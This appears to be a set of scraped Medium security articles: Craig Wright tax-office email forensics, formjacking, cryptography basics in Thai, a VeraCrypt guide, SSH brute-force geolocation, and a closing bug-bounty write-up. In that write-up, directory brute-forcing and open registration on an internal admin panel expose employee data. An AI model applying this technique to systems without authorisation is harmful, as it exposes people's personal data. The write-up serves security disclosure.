The 2 year delay in approving Wright’s initial tax return for the 2009 tax season outlines the troubles Wright had in running his companies while under audits that he viewed as invasive and unfair. In the 2014 meeting he presciently tells the auditors “I did my best to try and hide the fact that I’ve been running bitcoin since 2009 but… by the end of this I think half the world is going to bloody know.”
During the middle of this audit in an alleged email between Craig Wright and Dave Kleiman dated 22 May 2012, Wright expresses frustration with the ATO’s “BS’ing” where he guesses “that they want to get a result out of attrition rather than honesty” and that “they will drain all I have if they can”. Wright continues venting his frustrations saying “They lost evidence and use my temper against me. I hate their lies. I did everything right and I am STILL punished.”
Craig’s aforementioned paranoia is on display in the early parts of the February 2014 meeting when Wright identifies that a private ruling issued by the ATO on 30 September 2013 was actually issued on 29 November 2013 and backdated. The backdating of the ruling was only discovered once Wright went to Internal Fraud and Investigations and had the authorization number investigated. Des McMaster, one of the auditors, shows frustration that Wright had obtained this information:
To add on to the dispute, Wright and his attorneys asserted that they had not received notice of the ruling
Two months after this February 2014 meeting with the ATO, on 15 April 2014 the ATO reached out to Ira Kleiman and provided Ira with copies of purported agreements between Wright and Dave Kleiman. Ira begins to distrust Wright from this point on, and it is two weeks later where Wright, in a message to Ira, accuses the ATO of fabricating documents:
In this, I have a GST debt, the company has a gain. On the software from WK to Coin-Exch, I have an overall GST debt owed of $3.7 million (give or take). The company gets a return of 3.7 million. The net outcome is zero tax as they cancel.
What the tax oﬃce can do is use this and hold payments back to the company. They are trying to ﬁsh. They want information that they are not legally entitled to have. So far, they have fabricated documents (and been caught), used half-truths to make it seem as if things are wrong to others and more.
We have exclusively obtained two Computer Forensics Reports performed on behalf of Wright’s company Demorgan Ltd where computer forensics expert Dr. Nick Sharples and digital forensics expert Alan Batey were independently appointed to examine email messages used in the ATO’s probe of Wright. These emails were used as evidence in the continuing audits and probes of Wright’s business dealings that culminated in the ATO raid on his Australian residence in December 2015, one day after Wired published an article accusing him of being one of the people behind the Satoshi Nakamoto team.
Dr. Sharples performed his forensic analysis on November 2015:
Of the four emails examined by Sharples, there is one email in particular that we will focus on for the purpose of this piece. This email, named DM5 in the forensic report, is given the title “ Private Ruling application Hotwire Preemptive Intelligence Pty Ltd DLM FOROFFICIAL-USE-ONLY .msg” and dated 01 November 2013. The title suggests the email is related to the notice of the private ruling supposedly issued on 30 September 2013 that Wright alleged was actually issued on 29 November 2013 and backdated. In the original 2014 transcript, Wright’s lawyers argue this ruling was never received:
Sharples notes immediately that there are two different Content-Type fields contained in the headers with different values. He notes that he does not know “how such a message could have been constructed.”
To understand the forensic report, we must become familiar with two pieces of email authentication. Sender Policy Framework (SPF) and DomainKeys Identified Mail (DKIM) are email authentication methods designed to detect forged sender addresses in emails (email spoofing). SPF allows the receiver to check that an email claiming to come from a specific domain comes from an IP address authorized by that domain’s administrators. DKIM allows the receiver to check that an email claimed to have come from a specific domain was indeed authorized by the owner of that domain.
Sharples notes that there is no SPF check or DKIM signature for this email:
In his conclusion, Sharples reiterates that the first (of two) Content-Type header fields contains an encoded date that is not consistent with the date the email was sent. This implies the email was not sent at the same time it was constructed.
Finally, Sharples concludes that the “inconsistencies with the email header values… raise questions in my mind concerning the provenance of the message.”
Similar analysis is performed on the other three emails in the report, and similar inconsistencies are found. Sharples notes specifically that “the ato.gov.au email system is configured to include the email header field ‘content-transfer-encoding’, and that none of the emails… have that field present, despite having purportedly originated from that domain.”
Dated 11 November 2015, Alan Batey also performed an independent analysis on a set of emails. He also performed analysis on email DM5.
Batey confirms that there is “neither an SPF or DKIM record present” for DM5, yet passes the SPF test “possibly due to their parent SPF record” (meaning it passed the SPF test for sge.net). Further analysis of “information available in the header of DM5 shows that the email was delayed for 2 days while in transit… [and] given the delay and the lack of signing of the email there is no assurance that the email has not been altered at the final hop.”
With all of this said, Batey comes to an even further startling conclusion: “The SPF record of DM5 shows that an additional 544 host are able to send on behalf of ATO.GOV.AU” and specifically that “any address from sge.net is permitted to send on behalf of ATO.GOV.AU”.
Batey’s analysis shows a potentially massive security hole once existent in the ATO and raises serious questions about the authenticity of the email used as evidence against Wright. Batey notes that “the email DM5 originates from sge.net and its SPF record contains an IP range’s of over 130,000 IP addresses… whereas the ATO address is limited to 4 IP addresses… This large IP range could be considered a potential security flaw as it allows emails to be sent from any one of these IP addresses and still pass the SPF test.” You can read Batey’s conclusion here:
The independent analysis done by Sharples and Batey indicates that there was a potential security vulnerability in the ATO’s networks while handling Wright’s case and specifically that there are legitimate questions regarding the provenance of individual emails used as evidence in the Wright case. It is noteworthy that Wright commissioned the independent forensic analysis just one month prior to the leaking of information about Wright’s supposed identity as Satoshi Nakamoto to Wired. As Ian Grigg has implied coordination between Wired and the ATO during these events, the timeline in light of this new information does raise questions themselves.
Looking at the analysis of email DM5 and the surrounding timeline of events, there are three insights that emerge:
With all of this said, it also raises questions about the authenticity of documents provided to Ira Kleiman by the ATO. These documents are being used as evidence in Kleiman’s lawsuit against Wright — some of which Wright has denied the authenticity of.
Written by
","['Bitcoin', 'Satoshi Nakamoto', 'Craig Wright', 'Australia', 'Cybersecurity']"
Formjacking: Hackers’ New Favorite Way to Steal Credit Card Information (And How to Avoid it),https://medium.com/hackernoon/formjacking-hackers-new-favorite-way-to-steal-credit-card-information-and-how-to-avoid-it-dbc2971961d1?source=tag_archive---------8-----------------------,"You’ve added your favorite products to the shopping cart. Now, it’s time to take your credit card out of your wallet and make the payment. As the site is secure and you have already done shopping on this e-commerce website in the past, you don’t think much before entering your credit/debit card details during the checkout.
But have you ever imagined that your card details can be stolen when you are making the payment to your favorite online store?
Yes, my friend, hackers can steal your card details and make you broke. In fact, stealing card details have become hackers’ new tool to swipe online shoppers’ money. And the term used for this unethical, malicious technique is Formjacking.
Formjacking is almost the same as ATM skimming, the only difference is it happens online. After entering credit or debit card details, when a user of an e-commerce website clicks on submit or its equivalent button, a malicious javascript code injected by a hacker to the e-store collects the credit card details of the user and send this information to the hacker’s server.
Once the hacker has the credit card details of users, he/she can use the details to do credit card frauds or sell the details to other cybercriminals on the dark web.
Symantec has created an infographic to explain the process.
Fromjacking is not a small threat. According to Symantec, formjacking attacks soared with an average of 4,800 websites compromised each month.
Popular brands like British Airways, Ticketmaster, Newegg, and Feedify publically reported formjacking reported by the hacker group Magecart.
Magecart is a common name given to a group of seven major card-skimming cybercriminals. Magecart threat group was responsible for the recent attack against Ticketmaster, Feedify, British Airways, Everlast, the National Republican Senate Committee, Newegg, Oxo, and Groopdealz. All these seven use the same toolset version, but their tactics and techniques differ.
RiskIQ and Flashpoint created a detailed document on different groups of Magecart. You can access the PDF from here. From this report, you can learn about each group’s tactics, targets, and victims and what makes these groups different from each other. You will also know about growing criminal underworld that helps these groups work and monetize their campaigns.
Magecart formjacking cybercriminals use malicious JavaScript to steal customers’ credit card information. As they exploit customer payment forms, a web browser-based script blocker can provide protection against formjacking attack.
Following are some effective script blockers for popular browsers:
As smaller online shopping sites might not have high protection level as the bigger sites have, avoiding shopping from small players can be a proactive way to stay safe online. But attacks on leading brands like British Airways proves that none is safe. But still, any small site is more likely to get attacked than a bigger site.
Many times attackers go through the third-party tools and applications. If you’re a site owner, you should test any software update before installing it.
Also, you should look for tools that check your website realtime and inform you if there is any change.
Written by
","['About', 'Help', 'Go Home', 'Online Security', 'Cybersecurity', 'Cybercrime']"
Foundation of Modern Cryptography - Bhume Bhumiratana - Medium,https://medium.com/@bhume/%E0%B8%9E%E0%B8%B7%E0%B9%89%E0%B8%99%E0%B8%90%E0%B8%B2%E0%B8%99-modern-cryptography-309fa4e0de05?source=tag_archive---------9-----------------------,"Modern Cryptography หรือ วิทยาการรหัสลับยุคปัจจุบัน เป็นศาสตร์ของความรู้ที่ประยุกต์เอาคณิตศาสตร์มาใช้ในการแก้โจทย์ด้าน Security โดยเฉพาะโจทย์ของ Confidentiality และ Integrity ซึ่งสามสิบกว่าปีที่ผ่านมา วิทยาการนี้ได้ก้าวหน้าไปอย่างมากมาย และศาสตร์ชุดนี้ถูกนำไปใช้อย่างแพร่หลายเพื่อเพิ่มความปลอดภัยในการจัดการข้อมูลและการสื่อสาร รวมถึงประยุกต์ใช้ในโจทย์อื่นๆที่น่าสนใจอีกมากมาย
คงมีหลายคนตั้งคำถามว่าแล้ว Modern Cryptography ต่างจากวิทยาการรหัสลับในอดีตที่เรียกกันว่า Cryptography อย่างไร จริงๆแล้ว ต่างกันตรงที่ Modern Cryptography นั้นมีการประยุกต์เอาคณิตศาสตร์ โดยเฉพาะการตั้งนิยาม และการพิสูจน์มาใช้อย่าจริงจัง เพื่อให้การสร้าง Cryptographic Protocol/Cipher มีมาตรฐานและพิสูจน์ได้ว่าปลอดภัยจริง ซึ่งต่างจาก Cryptography ในอดีตที่ทำแบบลองผิดลองถูก สร้างขึ้นมาแล้วก็ตั้งสมมติฐานว่าปลอดภัยจนกว่าจะถูกแฮก
ความยากของ Modern Cryptography ก็คือ เราจะพิสูจน์อย่างไรหละ ว่าจะไม่มีใครมาแฮกสิ่งที่เราสร้างขึ้นมาได้ คนที่มาแฮกอาจจะฉลาดกว่าเราก็ได้ อาจจะใช้วิธีที่เราคิดไม่ออก (ซึ่งก็คือปัญหาของโลก Classical Crypto หรือ วิทยาการรหัสลับยุคเก่านั่นเอง) ลองมาดูกันว่าเราพิสูจน์กันอย่างไร
หลักการของการสร้าง Modern Cryptographic Algorithm/Protocol ประกอบไปด้วยสามขั้นตอนหลักๆ คือ
ทั้งนี้ถ้าสามารถทำได้ทั้ง 3 อย่างข้างต้น แปลว่า Construction ดังกล่าวนั้น ปลอดภัย กล่าวคือ ถ้าคนร้ายมีความสามารถระดับ Adversary Model ที่กำหนด การ break Construction ที่ว่า (เช่นการเข้ารหัสแบบ GCM) ก็ยากไม่น้อยไปกว่าการแก้โจทย์ที่ยาก (ที่กำหนดใน Proof ในขั้นตอนที่ 3.) ที่นักวิจัยทั้งโลกพยายามแก้ไขมาเป็นสิบเป็นร้อยปีแต่ก็แก้ไม่ได้ ซึ่งก็ถือว่าปลอดภัยระดับหนึ่ง
พูดเป็นภาษาคนก็คือ การสร้างแบบนี้ ทำให้เรามั่นใจว่า ต่อให้เราไม่รู้ว่าคนร้ายเขาจะใช้วิธีอะไรมาทำลาย Protocol/Algorithm ที่เราสร้างขึ้น เราก็มั่นใจได้ว่า อย่างน้อยที่สุด เขาต้องเก่งกว่าทุกคนที่เคยพยายามแก้โจทย์ที่ยากข้อนี้แน่ๆ เมื่อเราพิสูจน์ได้ระดับนี้ เราก็ไม่จำเป็นต้องไปสันนิษฐานอีกต่อไปว่าคนร้ายจะใช้วิธีอะไร และมั่นใจได้ว่าถ้ามีคนร้ายดังกล่าวจริง เขาไม่ใช่แค่เก่งกว่าเรา แต่เก่งกว่านักวิจัยคนอื่นๆอีกเป็นร้อยเป็นพันด้วย
ดังที่กล่าวไปแล้ว ปัจจัยที่สำคัญที่สุดปัจจัยหนึ่งของ Modern Cryptography นั้น คือการมี “นิยาม” ที่ดี (Definition) ซึ่งนี่คือพื้นฐาน ที่หลายๆคนอาจจะคิดว่าง่าย แต่จริงๆแล้ว มีคนเข้าใจเรื่องนี้ผิดอยู่เยอะทีเดียว ลองมาดูกันนะครับ
คำถามนี้ หลายๆคนที่เคยเรียนวิชา วิทยาการรหัสลับ หรือเรียนวิชา Information Security คงเคยถูกถาม (หรือเคยตั้งคำถามมาก่อน) ซึ่งๆหลายๆคำตอบที่อาจจะเคยได้ยินมาอาจจะเป็นข้อหนึ่งข้อใดในนี้
มาลองพิจารณากันนะครับ เริ่มต้นเลย ข้อ 1. ไม่ใช่ นิยามของการเข้ารหัสข้อมูล “ที่ดี” พูดแบบนี้แล้วหลายคนอาจจะงง แต่เพราะข้อ 1. เป็นนิยามของการเข้ารหัสข้อมูล “เฉยๆ” กล่าวคือ มันคือพื้นฐาน ในโลกนี้มี algorithm มากมายที่มีคุณสมบัตินี้ แต่กลับไม่ดี (และ algorithm ใดที่ไม่มีคุณสมบัตินี้ ก็ไม่นับเป็น algorithm การเข้ารหัสเลยด้วยซ้ำ)
ข้อ 2. อาจจะฟังดูดีนะครับ ว่าทุก ciphertext มี key เดียวที่ถอดรหัสได้ แต่จริงๆแล้ว ข้อนี้ ก็ไม่ใช่นิยามที่ดีอีกนั่นแหละ เพราะการที่เราจะมี key หลายๆอัน หรือ key ถอดรหัสที่ต่างจาก key เข้ารหัส (เช่น asymmetric encryption) ก็ไม่เสียหาย มีหลายโจทย์ที่เราใช้ประโยชน์จากคุณสมบัติของการมี key หลายๆอันได้
ข้อ 3 & 4 ก็ฟังดูน่าจะเป็นคุณสมบัติที่ดี มีหลายคนย้ำข้อนี้เวลาสอน แต่จริงๆแล้ว ข้อ 3 & 4 ก็ไม่ใช่คุณสมบัติที่ดีครับ แต่เป็น คุณสมบัติที่ “บางคน” พึงประสงค์ หรือกล่าวง่ายๆคือ ดีในหลายๆ โจทย์ แต่ไม่ได้ดีเสมอไป บางครั้ง เราอาจจะอยากได้ algorithm ที่เข้ารหัสเร็ว แต่ถอดรหัสได้ช้า (เช่น เพื่อป้องกันการ bruteforce key ถ้าการถอดรหัสช้า ก็จะทำให้ bruteforce ยากขึ้น)
ข้อ 5 นั้นเป็นข้อที่ผมได้ยินบ่อยมาก แต่จริงๆแล้ว ข้อนี้ ไม่ใช่คุณสมบัติที่ดีเลยสักนิด เพราะข้อนี้ เน้นการปกป้อง key โดยไม่กล่าวถึงการปกป้องข้อความที่เข้ารหัส หากคนร้ายไม่สามารถเดา key ได้ แต่เดาได้ว่าเราเข้ารหัส คำตอบของคำถาม Yes/No ได้ถูกต้องได้บ่อยๆ (โอกาสมี 50/50 ถ้าเดามั่ว แต่คนร้ายอาจจะเห็น ciphertext แล้วเดาได้ 70%) งั้น algorithm ดังกล่าวก็เป็น algorithm ที่ไม่ดีอยู่ดี ต่อให้เดา key ยากแค่ไหนก็ตาม
ถ้าเช่นนั้น นิยามที่ดีคืออะไร? นิยามที่ดี สั้นๆครับ คือ
การเข้ารหัสที่ดี เมื่อคนร้ายเห็นข้อความที่เข้ารหัสแล้ว ต้องไม่ทราบอะไรเกี่ยวกับข้อความ plaintext ก่อนการเข้ารหัสเลย
นิยามก็ง่ายๆแค่นี้แหละครับ ตรงตัว เราต้องการปกป้อง plaintext แต่เราไม่รู้ว่าคนร้ายอยากรู้อะไรเกี่ยวกับ plaintext ก็ตั้งไปเลย ว่าคนร้ายต้องไม่ทราบอะไรเลย
ทั้งนี้ แม้แต่ในนิยามนี้ ก็ทำจริงได้ยาก เพราะ เมื่อมีการสื่อสาร คนร้ายย่อมสามารถรู้บางอย่างได้ เช่น
นี่คือตัวอย่างของการมีนิยามที่ดี ต้องตรงประเด็น ชัดเจน เข้าใจได้ง่าย ไม่อ้อมค้อม
นอกจากที่กล่าวไปแล้ว ในวิทยาการรหัสลับ เรายังยึดถือหลักการอีกหนึ่งข้อ คือ Kerckhoffs’s Principle
A cryptosystem should be secure even if everything about the system, except the key, is public knowledge.
กล่าวคือ cryptosystem (หรือระบบการเข้ารหัสลับ) ที่ดีมีความปลอดภัย ควรจะปลอดภัยแม้ว่าทุกคน (รวมถึงคนร้าย) จะรู้ถึงทุกอย่างที่เกี่ยวกับการเข้ารหัส ยกเว้น key เท่านั้น นี่รวมถึง algorithm ที่ใช้ (open-design) implementation ที่ใช้ (open-source) ขนาดของ key ที่ใช้ เป็นต้น
นี่ถือเป็นหลักการที่ดี เพราะต่อให้คนร้ายรู้ทุกอย่าง ถ้าไม่รู้ key ก็ไม่สามารถรู้อะไรเกี่ยวกับข้อความที่เราเข้ารหัสได้เลย แปลว่าระบบเราน่าเชื่อถือมาก เราก็จะอุ่นใจได้มาก
ทำไมหลักการดังกล่าวถึงสำคัญ เพราะถ้า ความปลอดภัยของระบบเรา ขึ้นอยู่กับอย่างอื่นที่ไม่ใช่แค่ key ด้วย เช่น ขึ้นอยู่กับว่าคนร้ายไม่รู้ว่าเราใช้ algorithm อะไร เมื่อถึงวันที่คนร้ายเขารู้ ระบบเราก็ถือว่าไม่ปลอดภัยอีกต่อไป ฉะนั้น การออกแบบระบบเรา จะต้องซ่อนทั้ง algorithm ที่ใช้และ key ซึ่งซ่อนสองอย่างย่อมยากกว่าหนึ่งอย่าง โดยเฉพาะ ถ้าเราต้องใส่ implementation ของ algorithm ดังกล่าวลงไปในโปรแกรมที่ใช้ในคอมพิวเตอร์หลายๆเครื่อง แปลว่าเราต้องปกป้องทุกเครื่องด้วย ไม่ใช่แค่ key เพียงอย่างเดียว
แปลว่าอะไร หากผู้ใด ไม่มั่นใจในระบบการเข้ารหัสพอที่จะบอกเราว่า เขาใช้ algorithm ใด เขียนด้วย ภาษาอะไร library อะไร และ key ความยาวเท่าไหร่ แล้ว แนวโน้มแปลว่า เขาไม่มั่นใจใน cryptosystem ที่เขาใช้นั่นเอง
Written by
","['Security', 'Cybersecurity', 'Cryptography']"
Full Disk Encryption with VeraCrypt - Andrew Douma - Medium,https://medium.com/@securitystreak/veracrypt-full-disk-drive-encryption-fde-157eacbf0b61?source=tag_archive---------0-----------------------,"A straightforward guide to getting you working with VeraCrypt. Protect sensitive data on your hard-drive, USB stick, and external drives.
This article serves as a supplement to the Pentester’s Guide to Windows 10 Privacy & Security and helps you avoid any mistakes that could result in 100% data loss — regardless of your preferred platform and filesystem.
Information loss or theft of trade secrets, application source code, customer- and employee records — can put your startup in an early grave. Private photos can ruin a (political) career.
Better to be safe than sorry? I would say so.
Andrew Douma is a vendor-neutral IT Security Professional. He performs professional audits, penetration tests, and risk assessments. He designs secure networks and engineers high-assurance systems in the Cloud.
You can connect with him on GoodReads, LinkedIn, Medium, and Twitter.
Buying a professional penetration testing laptop| Evaluating QubesOS as a Penetration Testing Platform | Finding the right exploit code | Antivirus in 2017: Why? Which? How? | Penetration Testers’ Guide to Windows 10 Privacy & Security | Hacker to Security Pro! On the Shoulders of #InfoSec Giants | Securing an Android Phone or Tablet (LineageOS) | Password (IN)SANITY: Intelligent Password Policy & Best Practices | Security Architecture Patterns I & Patterns II
If you have one single backup of a file, you do not have a backup. If your backup drive is stored next to your computer and not in a fire-proof safe, you do not have a backup. If you never test your backup, you do not have a backup.
Destructive malware will attempt to encrypt (or erase) every storage device or cloud storage provider your system is linked with.
When you add encryption to the mix, adopting proper backup routines and applying critical thinking is crucial:
Though all created volumes have an embedded backup header at the end of the volume — this is no absolute guarantee. If the header for your VeraCrypt volume is ever damaged, you will be unable to access your encrypted data.
No attacker can decrypt your data without the correct password / Keyfiles — even if they have your VeraCrypt backup files.
You can download the full user guide [PDF] and the installer for your operating system from their website. Take note of some of the settings related to Favorites and Preferences.
VeraCrypt can create encrypted containers and encrypt partitions on almost all versions of Linux, MacOS, and Windows. It only supports whole disk encryption for Windows.
Make sure to verify the integrity of each update! Users of encryption software have been actively targeted in the past.
The process is like the one documented for verifying the integrity the Qubes OS installation media — except it uses this GPG/PGP key with ID 0x54DDD393 and fingerprint 993B7D7E8E413809828F0F29EB559C7C54DDD393.
VeraCrypt is the preferred replacement for TrueCrypt.
A relatively frequent task for me is encrypting a new ADATA HD720 water/dust/shock proof external hard disk for a new project/client. I also keep my USB sticks encrypted.
I recommend using your favorite partition tool to re-partition the drive as follows. This avoids Windows and MacOS prompts offering to “format” and “initialize” the drive every time you insert it.
If you add a minuscule partition at the end of the drive, with a filesystem, all Operating Systems recognize (exFat/FAT32) you will not get prompted.
MacOS comes with the Disk Utility and Windows has Disk Manager. To access it open up File Explorer > right click on This PC > click Manage > and select the Storage tab.
Paragon offers an alternative Windows partitioning tool that is free for personal use. If you plan to use your external drive on both MacOS and Windows, I highly recommend purchasing MacDrive Pro or Paragon NTFS.
Using a journaled filesystem reduces recovery time after a crash (and increases the likelihood of a successful recovery!) Mac OS Extended or Windows NTFS are your options.
VeraCrypt’s User Interface is almost identical. Click on “Create Volume” and select “Create a volume within a partition/drive.”
I prefer standard VeraCrypt volumes. A “hidden” volume could provide me with more plausible deniability. However, do not skip over the fine print!
Next, select the first partition on your external hard disk and continue.
I use the AES(256) encryption algorithm and the SHA-512 hash algorithm. You can benchmark the performance for each encryption option on your hardware.
In the future I will address this in greater detail, for now, please accept that:
The final step will encrypt and format the drive. Depending on the size and speed of your storage media, this may take a few minutes to an entire night.
Once complete, you can mount the encrypted volume by choosing a Slot (on MacOS) or a Drive letter (on Windows).
Next, click the “Select Device” button and pick the encrypted partition of your external drive.
Click the “Mount” button and enter your passphrase / Keyfiles before clicking OK.
If you are using a password manager: Copy and pasting the passphrase only works if “Display password” is checked.
Rename it to something fresh and start saving your files on the encrypted partition of your external storage media. Always “safely eject” your disks to ensure all data is written to disk!
VeraCrypt supports encrypting non-system GPT (GUID Partition Table) partitions/drives across all platforms. Their security model covers what it does and does not protect you from.
For it to encrypt your boot partitions or entire disk (containing multiple partitions), it requires a legacy MBR disk (Master Boot Record) to encrypt the drive Windows is installed on fully.
You may need to adjust your Bios configuration and re-install Windows. Commercial partitioning software can convert your existing installation from GPT to MBR format as well.
You can always opt to use a VeraCrypt encrypted file container on top of Windows BitLocker or hardware-based full disk encryption (SSD FDE). Find answers to your questions in this Windows 10 hardening guide.
Having ensured your backups are current and work:
You will find an additional option in the Volume Creation Wizard on the Windows version of VeraCrypt, allowing you to enable full drive encryption.
You will have the option to increase your plausible deniability by installing a decoy operating system — but be mindful of the small print!
I always opt to encrypt the whole drive as well as the Host Protected Area. I have not tested VeraCrypt FDE on a Multi-boot system because of known issues.
VeraCrypt will install a Boot Loader that handles the pre-boot authentication. If you have an international keyboard, be aware that the pre-boot passphrase is always entered using the US keyboard layout.
You will need to decrypt your drive whenever you want to upgrade to the latest Windows build, for example from Redstone 1: v1607 “Anniversary Update” to Redstone 2: v1703 “Creators Update”.
VeraCrypt enables you to make, in essence, a large encrypted ZIP file you can use like you would a “virtual” USB stick.
Using the Volume Creation Wizard, try creating a 20 GB top-secret.crypt and a 40 GB work-project.crypt file. You are free to name your container anything you want i.e. pagefile.sys or family-bbq.avi.
You can mount and unmount them as needed. Passing through a dystopian border checkpoint? Best have everything unmounted. Trying to protect data from malicious exfil? Only mount it when needed.
Small containers are easy to transport. They can serve to secure off-site backups long-term or transfer a sensitive pentesting report across an insecure channel. For Turing’s sake, stop using plain-text email!
Click the ♡ to recommend this article.
Written by
","['Windows 10', 'Encryption', 'Data Breach', 'Privacy', 'Cybersecurity']"
"Geolocating SSH Hackers In Real-Time - devconnected — DevOps, Sysadmins & Engineering - Medium",https://medium.com/schkn/geolocating-ssh-hackers-in-real-time-108cbc3b5665?source=tag_archive---------3-----------------------,"The rise of the machines has arrived. While you’re reading this article, thousands if not hundreds of thousands of cyberattacks are performed. Some of them are more sophisticated than others : from trojans, phishing attempts, malware infections to botnets attacks (also known as DDoS), cyberattacks are literally everywhere.
Today we are taking a look at a very specific type of attacks : SSH brute-force attacks. We will eventually design a tool that tracks, monitors and locates attackers, in real-time.
Before jumping into architectural concerns and coding, I believe it is important for everybody to be on the same page regarding SSH. (if you already know what SSH is, skip to the next section).
SSH (that stands for Secure Shell) is a secure communication protocol. It allows computer to talk to each other, using a secure tunnel that nobody else can understand. SSH comes as an evolution of the Telnet Protocol, that also provides a communication layer, but unsecure.
SSH is very widely used to access distant remote machines and handle some administration tasks on them.
Note : if we were to connect to our machines using Telnet, the entire world could see our password, and it would be as easy as opening Wireshark and capturing Telnet packets. Say bye to your VMs.
How is it built?
Well.. like HTTPS, SSH is built on common cryptographic techniques: symmetrical encryption or asymmetrical encryption for the most part. Those two techniques are in a way verifying the identity of the two hosts. If I am the client, am I talking to the server that I tried to reach to the first place, or is it a smart kid in between wanting my Facebook credentials?
As a second step, you are asked to provide SSH credentials for the authentication. If those two steps (cryptographic verifications + authentication) are valid, you are logged in.
Now if your server, or computer, or router is connected to the Internet, it is very likely that it is receiving a bunch of cyberattacks everyday without you even noticing it.
Luckily, most of the attacks are not making it and are blocked by either firewalls or anti-malware solutions that may directly be built-in in your computer or in your router. But trust me, if you own a virtual machine in the cloud, somebody right now may try to access it, using a SSH brute force attack, to turn it into a botnet or to steal your personal information.
Today, we will put an end to that.
We will monitor, track and geolocates SSH brute-force attacks that are happening right now on your machine.
Before directly jumping into our architecture and design, how can we manually track SSH brute-force entries that are running on our machine?
For this article, I am using an Ubuntu 18.04 machine using rsyslog for logging tracking. For those who are not very familiar with Linux systems, rsyslog is a tool used on Linux distributions to record, standardize, transform and store logs on an aggregated tool (Logstash for example!).
SSH entries belong to the auth section of rsyslog, that is aggregated in var/log/auth.log .
So how does it look like? Here’s a screenshot from my own Ubuntu logs showing SSH brute-force attempts. Performing a simple less /var/log/auth.log | grep ssh will show you brute force attacks that might happen on your machine as well.
See the Failed password for invalid user ubntlines? That’s someone trying to access my machine with invalid credentials. And they are doing it a lot, dozens of attempts per day minimum. Right next to it sits their IP address along with the port that was allocated by SSH for the connection attempt.
Now that we have a way to capture SSH attempts, let’s build a system that can track them in realtime and show them in a realtime worldmap.
To monitor script kiddies, we are going to use this architecture :
Let’s explain every single part of our application.
First, we need to track rsyslog logs and filter SSH specific logs. Right before TCP forwarding our message, we need to normalize our message to a common format (Normalizer pattern.. anyone?) , I chose JSON for this.
Our message is then processed by a TCP Server listening for incoming logs. For convenience, I chose to use Node for this, but you can use any technology that you find suitable for this. The message is parsed, and the IP is sent to an IP geolocation service (IPStack in this case) that will provide us with a latitude and longitude among other things.
This record is then processed into InfluxDB, and displayed into Grafana for realtime monitoring. Quite simple isn’t it?
Before doing anything, we need to be able to filter incoming Ubuntu logs and target the one we are interested in : SSH logs and more precisely ssd service logs. For convenience, I chose to select messages starting with Failed as they are the one containing most of the information regarding the origin of the attack.
To perform this, one needs to head to /etc/rsyslog.d/50-default.conf which contains the standard configuration file for rsyslog. If you are not familiar with this file, this is where you configure where your logs are stored on your Linux system.
At the top of it, we are going to add some beautiful RainerScript that filters sshd messages. (Note : do not forget the stop instruction, otherwise they will also be stored in your default auth locations)
Now that our sshd messages are filtered and passed to our pipe, we need a way to normalize them. We will use templates for that. Templates are built-in tools for rsyslog that are used to transform an incoming message to a user defined template.
For our project, we will filter relevant information in the log message and build a JSON out of it.
In the /etc/rsyslog.d/ folder, let’s create a file called 01-basic-ip.conf that will host our template. To extract relevant information from the log, I will use a regex in a string template file.
The regex has to match messages starting with Failed and has three capturing groups : one for the username, one for the IP and one for the port. In regex language, it looks like this :
^ Failed.*user([a-zA-Z]*).*([0-9][0-9]*[0-9]*.[0-9][0-9]*[0-9]*.[0-9][0-9]*[0-9]*.[0-9][0-9]*[0-9]*).* port ([0-9]*)
Now that we have our regex, let’s encapsulate it into a JSON object using the string template. The final file looks like this.
rsyslog offers a wide panel of output modules for you to forward your logs. One of them is just native TCP forwarding, called omfwd. This is the directive we are going to use to forward our formatted message. Back to our 50-default-conf file.
In this case, our JSON will be forwarded to a TCP host listening on localhost port 7070 (the address of our Node server!).
Nice, we have our rsyslog pipeline.
Now, let’s head over to our TCP Server. The TCP server is the recipient for our JSON messages. For convenience with using JSON, I chose Node as a runtime. So what’s the role of our TCP server? Listen to incoming messages, query an external service to retrieve the geolocation of our new friend, and store the whole package to InfluxDB. I won’t keep the suspense running any longer, here’s the code for our server.
One side note to this code : latitude and longitude are encoded into something called geohashes which is a way to encode a latitude longitude pair and is used by the Grafana plugin to draw a point. For the final touch, let’s encapsulate this code into a systemd service and launch it.
We’re done for coding!
If you have read so far, here’s the good news : the fun part is coming. Now that we are storing our live data in InfluxDB, let’s bind Grafana to it and visualize it.
As a recap, our InfluxDB measurement looks like this :
To track our geohashes on a realtime map, we are going to use the plugin WorldMap Panel from Grafana Labs.
Every single value occurrence in our measurement is going to be a circle on the map. Of course, the circles get bigger if we have more occurrences of certain IPs on our machine. Without waiting more, here’s the map!
Here we have it!
All the locations trying to brute-force my machine. We can very precise by zooming on the map, and see exactly where the attack was coming from!
Over a period of 6 days, my machine was attacked 1660 times. That’s around 270 attacks a day on average. Here’s everything that was attempted as a login.
A very special mention to the ‘wetserver’ attempt. I know that it is a Digital Ocean � one, but still.. ‘Superman’, nice try, but I am not that megalomaniac when it comes to choosing my user credentials..
Out of those 1660 attacks, around 750 were performed from a single IP address located in Buffalo, in the NY region. The second most SSH spammer comes from.. Stockholm, in Sweden.
For the rest of the attacks, they mainly come from Japan, China, Hong Kong, South Korea, and even Brazil, Great Britain and even Egypt.
I had a lot of fun designing and implementing this side-project. On a serious note, it shows that nobody is safe from those attacks and I hope that it can bring a bit of awareness on SSH brute-force attacks. When time won’t be that much of a scarse resource, I will write an article about how to secure your machine and prevent those attacks entirely.
Be very careful when it comes to SSH, its maintenance and administration is a key factor in any system. The NSA won’t disagree with this statement.
Until then, have fun with this little experiment. And as always, if you like my work, clap, comment and share this article. It always helps.
Thank you for your time.
Kindly,
Antoine.
Written by
","['DevOps', 'Monitoring', 'Productivity', 'Machine Learning', 'devconnected ⭐', 'Security', 'Software Development', 'Technology', 'Cybersecurity', 'Data Science']"
Getting access to 25000 employees details - Sahil Ahamad - Medium,https://medium.com/@ehsahil/getting-access-to-25k-employees-details-c085d18b73f0?source=tag_archive---------7-----------------------,"Hi guys,
I want to share one of my findings in a private program on HackerOne, which was — critical but straightforward one. During testing for that private program. I found an endpoint for Internal team management.
After opening the endpoint (refer the Image above), the only thing running in my mind was “How about I check the directories.” Thus, I immediately utilized Dirsearch to brute force all the directories.
Here is the exciting output.
Noticed? Anything?
It’s https://37.--.--.--/register :P
Upon opening the URL.
Yuss!!!! Registration page. � anddd….
I tried to register with my details. And.. there was a configuration error. I was like…
I decided to register one more time with the same email and ended up with an error i.e.
“The email is already registered.”
okay, let’s go and log in.
So, I tried to log in with my registered credentials anddd…..
Successfully Logged in….
Admin management page.
Typical employee details pages
Disclosed details include Name, Email, Phone-No, Employee ID, Shifts, Reports, Salaries etc.
